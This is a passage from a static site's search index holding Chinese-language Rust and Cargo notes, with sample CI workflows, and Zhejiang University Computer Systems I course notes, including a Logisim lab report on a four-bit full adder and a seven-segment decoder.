:stdin() \u5e26\u6709 Read trait\uff0c\u53ef\u4ee5\u5bf9\u5176\u8c03\u7528 read \u65b9\u6cd5 \u4e5f\u53ef\u4ee5\u8c03\u7528 std: :Stdin \u4e0a\u7684 read_line \u65b9\u6cd5 let mut line = String :: new (); let len_bytes = std :: io :: stdin (). read_line ( & mut line ). unwrap (); \u8f93\u51fa\u9664\u4e86\u901a\u8fc7 print \u4e4b\u5916\u8fd8\u53ef\u4ee5\u5229\u7528 Write trait \u7684\u65b9\u6cd5\uff0c\u5bf9 std: :stdout() \u8c03\u7528 .write \u65b9\u6cd5 \u6587\u4ef6\u8f93\u5165\u8f93\u51fa\u901a\u8fc7 std::fs::File::open \u6253\u5f00\u540e\u540c\u6837\u4f7f\u7528 Read \u548c Write \u7684\u65b9\u6cd5\u5373\u53ef","title":"\u8bed\u6cd5/\u7528\u6cd5\u8865\u5145"},{"location":"cs/pl/rust/misc/#reference","text":"Rust By Example Rust docs","title":"Reference"},{"location":"cs/pl/rust/misc/#cargo","text":"\u5e38\u89c4\u9879\u76ee\u5e03\u5c40\uff1a . \u251c\u2500\u2500 Cargo.lock \u251c\u2500\u2500 Cargo.toml \u251c\u2500\u2500 src/ \u2502 \u251c\u2500\u2500 lib.rs \u2502 \u251c\u2500\u2500 main.rs \u2502 \u2514\u2500\u2500 bin/ \u2502 \u251c\u2500\u2500 named-executable.rs \u2502 \u251c\u2500\u2500 another-executable.rs \u2502 \u2514\u2500\u2500 multi-file-executable/ \u2502 \u251c\u2500\u2500 main.rs \u2502 \u2514\u2500\u2500 some_module.rs \u251c\u2500\u2500 benches/ \u2502 \u251c\u2500\u2500 large-input.rs \u2502 \u2514\u2500\u2500 multi-file-bench/ \u2502 \u251c\u2500\u2500 main.rs \u2502 \u2514\u2500\u2500 bench_module.rs \u251c\u2500\u2500 examples/ \u2502 \u251c\u2500\u2500 simple.rs \u2502 \u2514\u2500\u2500 multi-file-example/ \u2502 \u251c\u2500\u2500 main.rs \u2502 \u2514\u2500\u2500 ex_module.rs \u2514\u2500\u2500 tests/ \u251c\u2500\u2500 some-integration-tests.rs \u2514\u2500\u2500 multi-file-test/ \u251c\u2500\u2500 main.rs \u2514\u2500\u2500 test_module.rs Cargo.toml \u4e0e Cargo.lock Cargo.toml \u63cf\u8ff0\u4e86\u4f9d\u8d56\u7b49\u5143\u4fe1\u606f\uff0c\u662f\u624b\u52a8\u4fee\u6539\u7684 Cargo.lock \u662f cargo \u81ea\u52a8\u7ef4\u62a4\u7684\u5173\u4e8e\u4f9d\u8d56\u7684\u66f4\u591a\u66f4\u51c6\u786e\u7684\u4fe1\u606f\uff08\u6bd4\u5982\u901a\u8fc7 git \u4e0b\u8f7d\u7684\u5305\u4f1a\u9644\u5e26 sha \u503c\uff09\uff0c\u4e0d\u5e94\u8be5\u88ab\u624b\u52a8\u4fee\u6539 lib \u5305\u4e2d\u7684 Cargo.lock \u5e94\u8be5\u6dfb\u52a0\u5230 .gitignore \u4e2d\uff0c\u800c bin \u5305\u4e2d\u7684 Cargo.lock \u9700\u8981\u9644\u5e26\u4e0a\u4f20 \u5b9e\u7528 GitHub Action \u811a\u672c cargo book \u4e2d\u811a\u672c name : Cargo Build & Test on : push : pull_request : env : CARGO_TERM_COLOR : always jobs : build_and_test : name : Rust project - latest runs-on : ubuntu-latest strategy : matrix : toolchain : - stable - beta - nightly steps : - uses : actions/checkout@v3 - run : rustup update ${{ matrix.toolchain }} && rustup default ${{ matrix.toolchain }} - run : cargo build --verbose - run : cargo test --verbose course.rs \u4e2d\u6d4b\u8bd5\u811a\u672c on : [ push , pull_request ] name : Continuous integration jobs : check : name : Check runs-on : ubuntu-latest steps : - uses : actions/checkout@v2 - uses : actions-rs/toolchain@v1 with : profile : minimal toolchain : stable override : true - run : cargo check test : name : Test Suite runs-on : ubuntu-latest steps : - uses : actions/checkout@v2 - uses : actions-rs/toolchain@v1 with : profile : minimal toolchain : stable override : true - run : cargo test fmt : name : Rustfmt runs-on : ubuntu-latest steps : - uses : actions/checkout@v2 - uses : actions-rs/toolchain@v1 with : profile : minimal toolchain : stable override : true - run : rustup component add rustfmt - run : cargo fmt --all -- --check clippy : name : Clippy runs-on : ubuntu-latest steps : - uses : actions/checkout@v2 - uses : actions-rs/toolchain@v1 with : profile : minimal toolchain : stable override : true - run : rustup component add clippy - run : cargo clippy -- -D warnings \u6307\u5b9a\u4f9d\u8d56 - \u9ed8\u8ba4\u4ece crates.io \u4e0a\u4e0b\u8f7d\uff0c\u53ea\u9700\u8981\u540d\u5b57\u548c\u7248\u672c\u53f7 - \u7248\u672c\u6307\u5b9a \u7248\u672c\u53f7\u4f7f\u7528 SemVer \u89c4\u8303\uff0c\u5373 major.minor.patch \u4e00\u4e2a\u7248\u672c\u53f7\u89c4\u5b9a\u7684\u662f\u4e00\u4e2a\u7248\u672c\u8303\u56f4 \u6700\u4f4e\u7248\u672c\u662f\u4e66\u5199\u51fa\u6765\u7684\u7248\u672c\uff0c\u6700\u9ad8\u7248\u672c\u4f1a\u4fdd\u8bc1\u6700\u5de6\u4fa7\u975e\u96f6\u7684\u7248\u672c\u53f7\u4e0d\u53d8\uff0c\u4f8b\uff1a 1.2.3 := >=1.2.3, <2.0.0 1.2 := >=1.2.0, <2.0.0 1 := >=1.0.0, <2.0.0 0.2.3 := >=0.2.3, <0.3.0 0.2 := >=0.2.0, <0.3.0 0.0.3 := >=0.0.3, <0.0.4 0.0 := >=0.0.0, <0.1.0 0 := >=0.0.0, <1.0.0 cargo update \u4e5f\u4f1a\u6309\u7167\u8fd9\u4e2a\u89c4\u8303\u66f4\u65b0\u5230\u5141\u8bb8\u7684\u6700\u9ad8\u7248\u672c\uff08\u5982 0.2.3 \u5982\u679c\u8981\u66f4\u65b0\u7684\u8bdd\uff0c\u4e14 0.2.5 \u662f\u6700\u65b0\u7684\u4ee5 0.2 \u5f00\u5934\u7684\u7248\u672c\uff0c\u5219\u53ea\u4f1a\u66f4\u65b0\u5230 0.2.5\uff09 \u6ce2\u6d6a\u53f7\uff1a ~1.2.3 := >=1.2.3, <1.3.0 ~1.2 := >=1.2.0, <1.3.0 ~1 := >=1.0.0, <2.0.0 \u901a\u914d\u7b26\uff1a * := >=0.0.0 1.* := >=1.0.0, <2.0.0 1.2.* := >=1.2.0, <1.3.0 \u4e5f\u53ef\u4ee5\u4f7f\u7528\u5927\u4e8e\u7b49\u4e8e\u5c0f\u4e8e\u53f7\uff0c\u4ee5\u53ca\u9017\u53f7\u5206\u9694\u7684\u591a\u4e2a\u9650\u5b9a\u5199\u6cd5 \u66f4\u6362 registry some-crate = { version = \"1.0\" , registry = \"my-registry\" } \u901a\u8fc7 git \u83b7\u53d6 regex = { git = \"https://github.com/rust-lang/regex\" } regex = { git = \"https://github.com/rust-lang/regex\" , branch = \"next\" } \u4ece\u672c\u5730\u8def\u5f84\u83b7\u53d6\uff08\u76f8\u5bf9\u8def\u5f84\u76f8\u5bf9\u4e8e Cargo.toml\uff09 some-crate = { path = \"...\" } some-crate = { path = \"...\" , version = \"...\" } publish \u7684\u8bdd\u9700\u8981\u5148\u5c06 some-crate publish \u6307\u5b9a\u4e86 version \u7684\u8bdd publish \u7684\u65f6\u5019\u4f1a\u4f7f\u7528 crates.io \u4e0a\u7684\u8fd9\u4e2a\u7248\u672c\uff0c\u5176\u5b83\u65f6\u5019\u4f7f\u7528\u672c\u5730\u7248\u672c \u5206\u5e73\u53f0\uff1a [target.'cfg(windows)'.dependencies] inhttp = \"0.4.0\" [target.'cfg(unix)'.dependencies] penssl = \"1.0.1\" [target.'cfg(target_arch = \"x86\")'.dependencies] ative-i686 = { path = \"native/i686\" } [target.'cfg(target_arch = \"x86_64\")'.dependencies] ative-x86_64 = { path = \"native/x86_64\" }","title":"Cargo"},{"location":"cs/pl/rust/misc/#reference_1","text":"The Cargo Book \u3001 \u4e2d\u6587\u7ffb\u8bd1\u7248 Cargo \u624b\u518c","title":"Reference"},{"location":"cs/system/","text":"\u8ba1\u7b97\u673a\u7cfb\u7edf \u00b6 Abstract \u6d59\u6c5f\u5927\u5b66 \u201c\u8ba1\u7b97\u673a\u7cfb\u7edf\u201d \u7cfb\u5217\u4e13\u4e1a\u8bfe\u7a0b\u7b14\u8bb0\u53ca\u76f8\u5173\u77e5\u8bc6 \u53c2\u8003\uff1a Computer System: A Programmer's Perspective (3rd.) Table of Contents \u00b6 \u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 \u6570\u5b57\u7684\u8868\u793a\u548c\u5904\u7406 \u6570\u5b57\u903b\u8f91\u57fa\u7840\uff08 TODO \uff09 \u7ec4\u5408\u903b\u8f91\u7535\u8def\u8bbe\u8ba1\uff08 TODO \uff09 \u65f6\u5e8f\u903b\u8f91\u7535\u8def\u8bbe\u8ba1\uff08 TODO \uff09 \u6307\u4ee4\u96c6\u4f53\u7cfb\u7ed3\u6784 \u5904\u7406\u5668\uff08 TODO \uff09 \u8ba1\u7b97\u673a\u7cfb\u7edf \u2161","title":"\u8ba1\u7b97\u673a\u7cfb\u7edf"},{"location":"cs/system/#_1","text":"Abstract \u6d59\u6c5f\u5927\u5b66 \u201c\u8ba1\u7b97\u673a\u7cfb\u7edf\u201d \u7cfb\u5217\u4e13\u4e1a\u8bfe\u7a0b\u7b14\u8bb0\u53ca\u76f8\u5173\u77e5\u8bc6 \u53c2\u8003\uff1a Computer System: A Programmer's Perspective (3rd.)","title":"\u8ba1\u7b97\u673a\u7cfb\u7edf"},{"location":"cs/system/#table-of-contents","text":"\u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 \u6570\u5b57\u7684\u8868\u793a\u548c\u5904\u7406 \u6570\u5b57\u903b\u8f91\u57fa\u7840\uff08 TODO \uff09 \u7ec4\u5408\u903b\u8f91\u7535\u8def\u8bbe\u8ba1\uff08 TODO \uff09 \u65f6\u5e8f\u903b\u8f91\u7535\u8def\u8bbe\u8ba1\uff08 TODO \uff09 \u6307\u4ee4\u96c6\u4f53\u7cfb\u7ed3\u6784 \u5904\u7406\u5668\uff08 TODO \uff09 \u8ba1\u7b97\u673a\u7cfb\u7edf \u2161","title":"Table of Contents"},{"location":"cs/system/cs1/","text":"\u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 \u00b6 Abstract \u6d59\u6c5f\u5927\u5b66 \u201c\u8ba1\u7b97\u673a\u7cfb\u7edf \u2160\u201d \u8bfe\u7a0b\u53ca\u76f8\u5173\u77e5\u8bc6\u7b14\u8bb0 \u5173\u4e8e \u8ba1\u7b97\u673a\u7cfb\u7edf \u2160\uff1a \u8bfe\u7a0b\u53f7\uff1a21121830 \u4fe1\u606f\u5b89\u5168\u4e13\u4e1a\u5fc5\u4fee\u8bfe \u5305\u542b \u5e38\u89c4\u610f\u4e49 \u4e0a\u7684 \u8ba1\u7b97\u673a\u903b\u8f91\u8bbe\u8ba1\u57fa\u7840 \u548c \u8ba1\u7b97\u673a\u7ec4\u6210\u4e0e\u8bbe\u8ba1 \u4e24\u95e8\u8bfe\u7684\u90e8\u5206\u5185\u5bb9 Table of Contents \u00b6 \u7406\u8bba\u90e8\u5206 \u6570\u5b57\u7684\u8868\u793a\u548c\u5904\u7406 \u6570\u5b57\u903b\u8f91\u57fa\u7840\uff08 TODO \uff09 \u7ec4\u5408\u903b\u8f91\u7535\u8def\u8bbe\u8ba1\uff08 TODO \uff09 \u65f6\u5e8f\u903b\u8f91\u7535\u8def\u8bbe\u8ba1\uff08 TODO \uff09 \u6307\u4ee4\u96c6\u4f53\u7cfb\u7ed3\u6784 \u5904\u7406\u5668\uff08 TODO \uff09 \u5b9e\u9a8c\u90e8\u5206 lab1-1: \u56db\u4f4d\u5168\u52a0\u5668\u548c\u4e03\u6bb5\u7ba1\u8bd1\u7801\u5668 lab1-2: \u591a\u8def\u9009\u62e9\u5668\u7684\u8bbe\u8ba1\u548c\u6d4b\u8bd5 lab2-1: \u590d\u6742\u64cd\u4f5c\uff1a\u52a0\u6cd5\u5668 lab2-2: \u590d\u6742\u64cd\u4f5c\uff1a\u4e58\u6cd5\u5668 lab3: \u4e03\u6bb5\u7ba1\u663e\u793a\u5668 lab4-1: RISC-V \u6c47\u7f16\u5b9e\u9a8c lab4-2: overflow \u7406\u89e3 lab5-1: \u5355\u5468\u671f CPU \u6570\u636e\u901a\u8def\u8bbe\u8ba1 lab5-2: \u5355\u5468\u671f CPU \u8bbe\u8ba1","title":"\u8ba1\u7b97\u673a\u7cfb\u7edf \u2160"},{"location":"cs/system/cs1/#i","text":"Abstract \u6d59\u6c5f\u5927\u5b66 \u201c\u8ba1\u7b97\u673a\u7cfb\u7edf \u2160\u201d \u8bfe\u7a0b\u53ca\u76f8\u5173\u77e5\u8bc6\u7b14\u8bb0 \u5173\u4e8e \u8ba1\u7b97\u673a\u7cfb\u7edf \u2160\uff1a \u8bfe\u7a0b\u53f7\uff1a21121830 \u4fe1\u606f\u5b89\u5168\u4e13\u4e1a\u5fc5\u4fee\u8bfe \u5305\u542b \u5e38\u89c4\u610f\u4e49 \u4e0a\u7684 \u8ba1\u7b97\u673a\u903b\u8f91\u8bbe\u8ba1\u57fa\u7840 \u548c \u8ba1\u7b97\u673a\u7ec4\u6210\u4e0e\u8bbe\u8ba1 \u4e24\u95e8\u8bfe\u7684\u90e8\u5206\u5185\u5bb9","title":"\u8ba1\u7b97\u673a\u7cfb\u7edf \u2160"},{"location":"cs/system/cs1/#table-of-contents","text":"\u7406\u8bba\u90e8\u5206 \u6570\u5b57\u7684\u8868\u793a\u548c\u5904\u7406 \u6570\u5b57\u903b\u8f91\u57fa\u7840\uff08 TODO \uff09 \u7ec4\u5408\u903b\u8f91\u7535\u8def\u8bbe\u8ba1\uff08 TODO \uff09 \u65f6\u5e8f\u903b\u8f91\u7535\u8def\u8bbe\u8ba1\uff08 TODO \uff09 \u6307\u4ee4\u96c6\u4f53\u7cfb\u7ed3\u6784 \u5904\u7406\u5668\uff08 TODO \uff09 \u5b9e\u9a8c\u90e8\u5206 lab1-1: \u56db\u4f4d\u5168\u52a0\u5668\u548c\u4e03\u6bb5\u7ba1\u8bd1\u7801\u5668 lab1-2: \u591a\u8def\u9009\u62e9\u5668\u7684\u8bbe\u8ba1\u548c\u6d4b\u8bd5 lab2-1: \u590d\u6742\u64cd\u4f5c\uff1a\u52a0\u6cd5\u5668 lab2-2: \u590d\u6742\u64cd\u4f5c\uff1a\u4e58\u6cd5\u5668 lab3: \u4e03\u6bb5\u7ba1\u663e\u793a\u5668 lab4-1: RISC-V \u6c47\u7f16\u5b9e\u9a8c lab4-2: overflow \u7406\u89e3 lab5-1: \u5355\u5468\u671f CPU \u6570\u636e\u901a\u8def\u8bbe\u8ba1 lab5-2: \u5355\u5468\u671f CPU \u8bbe\u8ba1","title":"Table of Contents"},{"location":"cs/system/cs1/lab1-1/","text":"\u56db\u4f4d\u5168\u52a0\u5668\u548c\u4e03\u6bb5\u7ba1\u8bd1\u7801\u5668 \u00b6 Abstract \u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 lab1-1 \u5b9e\u9a8c\u62a5\u544a\uff082022.03.11 ~ 2022.03.25\uff09 Warning \u4ec5\u4f9b\u5b66\u4e60\u53c2\u8003\uff0c\u8bf7\u52ff\u6284\u88ad \u5b9e\u9a8c\u5185\u5bb9 \u00b6 \u4f7f\u7528 Logisim \u5b9e\u73b0\u56db\u4f4d\u5168\u52a0\u5668 \u6253\u5f00 Logisim \u8f6f\u4ef6\uff0c\u6253\u5f00\u8f93\u5165\u6a21\u677f\u6587\u4ef6 full_adder.circ \u6587\u4ef6\u4e2d\u8868\u660e\u4e86\u8be5\u6a21\u5757\u7684\u8f93\u5165\u8f93\u51fa\u7aef\u53e3\uff0c\u5176\u4e2d A_0 \u81f3 A_3 \u662f A \u4fe1\u53f7\u4e3a\u4ece\u4f4e\u81f3\u9ad8\u4f4d\u7684 4 \u4e2a\u4f4d\u3002\u540c\u7406 B_0 \u81f3 B_3 \u662f B \u4fe1\u53f7\u4ece\u4f4e\u81f3\u9ad8\u4f4d\u7684 4 \u4e2a\u4f4d\uff0cCin \u662f\u8fdb\u4f4d\u8f93\u5165\uff1bS_out0 \u81f3 S_out3 \u662f S \u8f93\u51fa\u4fe1\u53f7\u4ece\u4f4e\u5230\u9ad8\u7684 4 \u4e2a\u4f4d\uff0cCout \u662f\u8fdb\u4f4d\u8f93\u51fa \u5b9e\u73b0\u6b63\u786e\u7684\u56db\u4f4d\u5168\u52a0\u5668\u7684\u7535\u8def\u7ed8\u753b\uff08\u5176\u4e2d\u7684\u7aef\u53e3\u53ef\u4ee5\u590d\u5236\u4f7f\u7528\uff0c\u5e76\u4e14\u53ef\u4ee5\u4f7f\u7528 poke tool \u66f4\u6539\u8f93\u5165\u4fe1\u53f7\uff09 \u4f7f\u7528 Logisim \u5b9e\u73b0\u4e03\u6bb5\u7ba1\u8bd1\u7801\u5668 \u6253\u5f00 Logisim \u8f6f\u4ef6\uff0c\u6253\u5f00\u8f93\u5165\u6a21\u677f\u6587\u4ef6 encoder.circ \u6587\u4ef6\u4e2d\u8868\u660e\u4e86\u8be5\u6a21\u5757\u7684\u8f93\u5165\u8f93\u51fa\u7aef\u53e3\uff0c\u5176\u4e2d A_0 \u81f3 A_3 \u662f A \u4fe1\u53f7\u4e3a\u4ece\u4f4e\u81f3\u9ad8\u4f4d\u7684 4 \u4e2a\u4f4d \u540c\u7406 B_0 \u81f3 B_6 \u662f B \u8f93\u51fa\u4fe1\u53f7\u4ece\u4f4e\u81f3\u9ad8\u4f4d\u7684 7 \u4e2a\u4f4d \u6b63\u786e\u8fde\u63a5\u8f93\u51fa\u4fe1\u53f7\u81f3\u4e03\u6bb5\u7ba1\u76f8\u5bf9\u5e94\u7684\u5f15\u811a \u5b9e\u73b0\u6b63\u786e\u7684\u4e03\u6bb5\u7ba1\u8bd1\u7801\u5668 \u56db\u4f4d\u5168\u52a0\u5668 \u00b6 \u56db\u4f4d\u5168\u52a0\u5668\u53ef\u4ee5\u901a\u8fc7\u5c06\u56db\u4e2a\u4e00\u4f4d\u5168\u52a0\u5668\u8fde\u63a5\u76f4\u63a5\u5f97\u5230\uff08\u6bcf\u4e00\u4f4d\u7684 Cout \u5bf9\u63a5\u5230\u9ad8\u4e00\u4f4d\u7684 Cin\uff0c\u6700\u4f4e\u4f4d Cin \u4e3a\u8f93\u5165\u4fe1\u53f7\u7684 Cin\uff0c\u6700\u9ad8\u4f4d\u7684 Cout \u4e3a\u8f93\u51fa\u4fe1\u53f7\u7684 Cout\uff09 \u4e00\u4f4d\u5168\u52a0\u5668 \u00b6 \u4e00\u4f4d\u5168\u52a0\u5668\u6709\u4e09\u4e2a\u8f93\u5165 A\u3001B\u3001Cin\uff0c\u4e24\u4e2a\u8f93\u51fa S\u3001Cout\u3002\u5176\u771f\u503c\u8868\uff1a .md-typeset table:not([class]) th { min-width: 0; } A B Cin S Cout 0 0 0 0 0 1 0 0 0 1 0 1 0 0 1 1 1 0 1 0 0 0 1 0 1 1 0 1 1 0 0 1 1 1 0 1 1 1 1 1 \u53ef\u4ee5\u53d1\u73b0 S \u662f A\u3001B\u3001Cin \u7684\u5f02\u6216\u548c\uff0cCout \u4e5f\u53ef\u4ee5\u63a8\u5bfc\u5f97\u51fa\uff1a \\[ S = (A\\oplus B)\\oplus Cin\\\\ Cout = (A\\&B) |((A\\oplus B)\\&Cin) \\] \u6309\u7167\u8fd9\u4e2a\u903b\u8f91\u6784\u9020\u51fa\u903b\u8f91\u7535\u8def\u5373\u53ef\uff1a \u56db\u4f4d\u5168\u52a0\u5668 \u00b6 \u76f4\u63a5\u5c06\u4e00\u4f4d\u5168\u52a0\u5668\u590d\u5236\u6210\u56db\u5206\uff0c\u6bcf\u4e2a\u8d1f\u8d23\u5bf9\u5e94\u4f4d\u6570\u76f8\u52a0\u5e76\u5e26\u4e0a\u4f4e\u4e00\u4f4d\u7684\u8fdb\u4f4d\uff0c\u7136\u540e\u8f93\u51fa\u7ed3\u679c\u7684\u4e00\u4f4d\uff0c\u5e76\u4e14\u5c06\u8f93\u51fa\u7684\u8fdb\u4f4d\u4f20\u7ed9\u9ad8\u4e00\u4f4d \u903b\u8f91\u7535\u8def\u56fe\uff1a \u6d4b\u8bd5 \u00b6 \u4ee4 A = 0 ~ 15\u3001B = 0 ~ 15\u3001Cin = 0/1\uff0c\u5747\u8fdb\u884c\u4e86\u6d4b\u8bd5\uff0c\u7ed3\u679c\u548c\u6b63\u5e38\u52a0\u6cd5\u7ed3\u679c\u76f8\u540c\uff0c\u5e76\u4e14\u5df2\u7ecf\u4ea4\u7ed9 TA \u9a8c\u6536\u8fc7\u3002 \u4e03\u6bb5\u7ba1\u8bd1\u7801\u5668 \u00b6 \u5b9e\u9a8c\u601d\u8def \u00b6 \u8fde\u63a5\u8f93\u51fa\u4fe1\u53f7\u5230\u4e03\u6bb5\u7ba1\u5f15\u811a\u53ef\u4ee5\u76f4\u63a5\u5bf9\u5e94\u4e03\u6bb5\u7ba1\u5f15\u811a\u4e0e LED \u6761\u7684\u5bf9\u5e94\u5173\u7cfb\u76f4\u63a5\u8fde\u63a5 \u5c06\u8f93\u5165\u4fe1\u53f7\u8f6c\u4e3a\u8f93\u51fa\u4fe1\u53f7\u53ef\u4ee5\u5148\u5199\u51fa\u5bf9\u5e94\u7684\u771f\u503c\u8868\uff0c\u7136\u540e\u4f7f\u7528 Logisim \u5185\u7f6e\u7684 \"Combinational Analysis\" \u529f\u80fd\u6784\u5efa\u903b\u8f91\u7535\u8def\uff0c\u907f\u514d\u91cd\u590d\u52b3\u52a8 \u8f93\u51fa\u4fe1\u53f7\u4e0e\u4e03\u6bb5\u7ba1\u5f15\u811a\u8fde\u63a5 \u00b6 \u6839\u636e\u5f15\u811a\u4e0e LED \u6761\u7684\u5bf9\u5e94\u56fe\uff1a \u5e76\u5c06 B0 ~ B6 \u4f9d\u6b21\u89c6\u4e3a A ~ G \u4e03\u4e2a LED \u6761\uff0c\u53ef\u4ee5\u8fde\u63a5\u51fa\uff1a \u8bd1\u7801\u5668 \u00b6 \u73b0\u6709\u8f93\u5165 A\uff08\u4ece\u9ad8\u4f4d\u5230\u4f4e\u4f4d A3 ~ A0\uff09\u4ee5\u4e8c\u8fdb\u5236\u5f62\u5f0f\u8868\u793a\u4e00\u4e2a\u6570\uff0c\u8981\u5c06\u5176\u8f6c\u6362\u4e3a\u4e03\u4f4d\u8f93\u51fa B0 ~ B6\uff0c\u771f\u503c\u8868\uff1a \u751f\u6210\u903b\u8f91\u7535\u8def\u56fe\uff1a \u6d4b\u8bd5 \u00b6 \u5df2\u7ecf\u7ec4\u5408\u4e86 0000 ~ 1111\uff080 ~ F\uff09\u6240\u6709\u60c5\u51b5\uff0c\u663e\u793a\u5747\u6b63\u5e38\u3002","title":"\u7cfb\u7edf I lab1-1"},{"location":"cs/system/cs1/lab1-1/#_1","text":"Abstract \u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 lab1-1 \u5b9e\u9a8c\u62a5\u544a\uff082022.03.11 ~ 2022.03.25\uff09 Warning \u4ec5\u4f9b\u5b66\u4e60\u53c2\u8003\uff0c\u8bf7\u52ff\u6284\u88ad","title":"\u56db\u4f4d\u5168\u52a0\u5668\u548c\u4e03\u6bb5\u7ba1\u8bd1\u7801\u5668"},{"location":"cs/system/cs1/lab1-1/#_2","text":"\u4f7f\u7528 Logisim \u5b9e\u73b0\u56db\u4f4d\u5168\u52a0\u5668 \u6253\u5f00 Logisim \u8f6f\u4ef6\uff0c\u6253\u5f00\u8f93\u5165\u6a21\u677f\u6587\u4ef6 full_adder.circ \u6587\u4ef6\u4e2d\u8868\u660e\u4e86\u8be5\u6a21\u5757\u7684\u8f93\u5165\u8f93\u51fa\u7aef\u53e3\uff0c\u5176\u4e2d A_0 \u81f3 A_3 \u662f A \u4fe1\u53f7\u4e3a\u4ece\u4f4e\u81f3\u9ad8\u4f4d\u7684 4 \u4e2a\u4f4d\u3002\u540c\u7406 B_0 \u81f3 B_3 \u662f B \u4fe1\u53f7\u4ece\u4f4e\u81f3\u9ad8\u4f4d\u7684 4 \u4e2a\u4f4d\uff0cCin \u662f\u8fdb\u4f4d\u8f93\u5165\uff1bS_out0 \u81f3 S_out3 \u662f S \u8f93\u51fa\u4fe1\u53f7\u4ece\u4f4e\u5230\u9ad8\u7684 4 \u4e2a\u4f4d\uff0cCout \u662f\u8fdb\u4f4d\u8f93\u51fa \u5b9e\u73b0\u6b63\u786e\u7684\u56db\u4f4d\u5168\u52a0\u5668\u7684\u7535\u8def\u7ed8\u753b\uff08\u5176\u4e2d\u7684\u7aef\u53e3\u53ef\u4ee5\u590d\u5236\u4f7f\u7528\uff0c\u5e76\u4e14\u53ef\u4ee5\u4f7f\u7528 poke tool \u66f4\u6539\u8f93\u5165\u4fe1\u53f7\uff09 \u4f7f\u7528 Logisim \u5b9e\u73b0\u4e03\u6bb5\u7ba1\u8bd1\u7801\u5668 \u6253\u5f00 Logisim \u8f6f\u4ef6\uff0c\u6253\u5f00\u8f93\u5165\u6a21\u677f\u6587\u4ef6 encoder.circ \u6587\u4ef6\u4e2d\u8868\u660e\u4e86\u8be5\u6a21\u5757\u7684\u8f93\u5165\u8f93\u51fa\u7aef\u53e3\uff0c\u5176\u4e2d A_0 \u81f3 A_3 \u662f A \u4fe1\u53f7\u4e3a\u4ece\u4f4e\u81f3\u9ad8\u4f4d\u7684 4 \u4e2a\u4f4d \u540c\u7406 B_0 \u81f3 B_6 \u662f B \u8f93\u51fa\u4fe1\u53f7\u4ece\u4f4e\u81f3\u9ad8\u4f4d\u7684 7 \u4e2a\u4f4d \u6b63\u786e\u8fde\u63a5\u8f93\u51fa\u4fe1\u53f7\u81f3\u4e03\u6bb5\u7ba1\u76f8\u5bf9\u5e94\u7684\u5f15\u811a \u5b9e\u73b0\u6b63\u786e\u7684\u4e03\u6bb5\u7ba1\u8bd1\u7801\u5668","title":"\u5b9e\u9a8c\u5185\u5bb9"},{"location":"cs/system/cs1/lab1-1/#_3","text":"\u56db\u4f4d\u5168\u52a0\u5668\u53ef\u4ee5\u901a\u8fc7\u5c06\u56db\u4e2a\u4e00\u4f4d\u5168\u52a0\u5668\u8fde\u63a5\u76f4\u63a5\u5f97\u5230\uff08\u6bcf\u4e00\u4f4d\u7684 Cout \u5bf9\u63a5\u5230\u9ad8\u4e00\u4f4d\u7684 Cin\uff0c\u6700\u4f4e\u4f4d Cin \u4e3a\u8f93\u5165\u4fe1\u53f7\u7684 Cin\uff0c\u6700\u9ad8\u4f4d\u7684 Cout \u4e3a\u8f93\u51fa\u4fe1\u53f7\u7684 Cout\uff09","title":"\u56db\u4f4d\u5168\u52a0\u5668"},{"location":"cs/system/cs1/lab1-1/#_4","text":"\u4e00\u4f4d\u5168\u52a0\u5668\u6709\u4e09\u4e2a\u8f93\u5165 A\u3001B\u3001Cin\uff0c\u4e24\u4e2a\u8f93\u51fa S\u3001Cout\u3002\u5176\u771f\u503c\u8868\uff1a .md-typeset table:not([class]) th { min-width: 0; } A B Cin S Cout 0 0 0 0 0 1 0 0 0 1 0 1 0 0 1 1 1 0 1 0 0 0 1 0 1 1 0 1 1 0 0 1 1 1 0 1 1 1 1 1 \u53ef\u4ee5\u53d1\u73b0 S \u662f A\u3001B\u3001Cin \u7684\u5f02\u6216\u548c\uff0cCout \u4e5f\u53ef\u4ee5\u63a8\u5bfc\u5f97\u51fa\uff1a \\[ S = (A\\oplus B)\\oplus Cin\\\\ Cout = (A\\&B) |((A\\oplus B)\\&Cin) \\] \u6309\u7167\u8fd9\u4e2a\u903b\u8f91\u6784\u9020\u51fa\u903b\u8f91\u7535\u8def\u5373\u53ef\uff1a","title":"\u4e00\u4f4d\u5168\u52a0\u5668"},{"location":"cs/system/cs1/lab1-1/#_5","text":"\u76f4\u63a5\u5c06\u4e00\u4f4d\u5168\u52a0\u5668\u590d\u5236\u6210\u56db\u5206\uff0c\u6bcf\u4e2a\u8d1f\u8d23\u5bf9\u5e94\u4f4d\u6570\u76f8\u52a0\u5e76\u5e26\u4e0a\u4f4e\u4e00\u4f4d\u7684\u8fdb\u4f4d\uff0c\u7136\u540e\u8f93\u51fa\u7ed3\u679c\u7684\u4e00\u4f4d\uff0c\u5e76\u4e14\u5c06\u8f93\u51fa\u7684\u8fdb\u4f4d\u4f20\u7ed9\u9ad8\u4e00\u4f4d \u903b\u8f91\u7535\u8def\u56fe\uff1a","title":"\u56db\u4f4d\u5168\u52a0\u5668"},{"location":"cs/system/cs1/lab1-1/#_6","text":"\u4ee4 A = 0 ~ 15\u3001B = 0 ~ 15\u3001Cin = 0/1\uff0c\u5747\u8fdb\u884c\u4e86\u6d4b\u8bd5\uff0c\u7ed3\u679c\u548c\u6b63\u5e38\u52a0\u6cd5\u7ed3\u679c\u76f8\u540c\uff0c\u5e76\u4e14\u5df2\u7ecf\u4ea4\u7ed9 TA \u9a8c\u6536\u8fc7\u3002","title":"\u6d4b\u8bd5"},{"location":"cs/system/cs1/lab1-1/#_7","text":"","title":"\u4e03\u6bb5\u7ba1\u8bd1\u7801\u5668"},{"location":"cs/system/cs1/lab1-1/#_8","text":"\u8fde\u63a5\u8f93\u51fa\u4fe1\u53f7\u5230\u4e03\u6bb5\u7ba1\u5f15\u811a\u53ef\u4ee5\u76f4\u63a5\u5bf9\u5e94\u4e03\u6bb5\u7ba1\u5f15\u811a\u4e0e LED \u6761\u7684\u5bf9\u5e94\u5173\u7cfb\u76f4\u63a5\u8fde\u63a5 